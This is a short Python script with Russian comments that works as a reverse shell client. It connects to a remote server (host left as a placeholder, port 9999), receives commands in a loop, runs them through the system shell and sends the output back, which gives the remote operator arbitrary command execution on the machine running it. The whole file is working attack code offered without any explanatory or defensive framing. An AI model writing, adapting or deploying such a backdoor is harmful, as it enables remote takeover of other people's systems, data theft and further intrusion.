import socket
import os
import subprocess

SERVER_HOST = "ip"  # IP-адрес сервера
SERVER_PORT = 9999         # Порт сервера

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = client.recv(1024).decode()

    if command.lower() == "exit":
        print("[-] Соединение закрыто.")
        break

    if command.startswith("cd"):
        try:
            path = command.split(" ", 1)[1]
            os.chdir(path)
            response = f"Каталог изменён на: {os.getcwd()}"
        except Exception as e:
            response = f"Ошибка смены каталога: {str(e)}"
    else:
        try:
            # Автоматически добавляем флаг -a к команде ls
            if command.strip() == "ls":
                command = "ls -a"
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = output.stdout.strip() or output.stderr.strip() or "Команда выполнена, но ничего не вернула."
        except Exception as e:
            response = f"Ошибка выполнения команды: {str(e)}"

    client.send(response.encode())